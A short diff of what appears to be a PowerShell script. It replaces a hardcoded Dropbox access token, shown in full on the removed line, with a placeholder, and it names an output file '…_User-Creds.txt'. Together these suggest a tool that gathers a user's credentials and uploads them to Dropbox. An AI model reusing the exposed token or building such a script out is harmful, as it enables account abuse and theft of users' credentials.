@@ -20,7 +20,7 @@
 	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
 #>
 
-$DropBoxAccessToken = "sl.B1RcM_cZh7fm9KH21NUIOxbzP2JndMt9DYh_zq3kczEuW5Q37R8R7Jttd_1RqFhMOkZsM0Lvq6PkARENC45odak4g2n-VSt7m7RH8PrDoPTpnAjnJW2G99pw7VwxhtrbTuklmgAlkbqwDxlswgTnoIA"
+$DropBoxAccessToken = "secretkey"
 
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
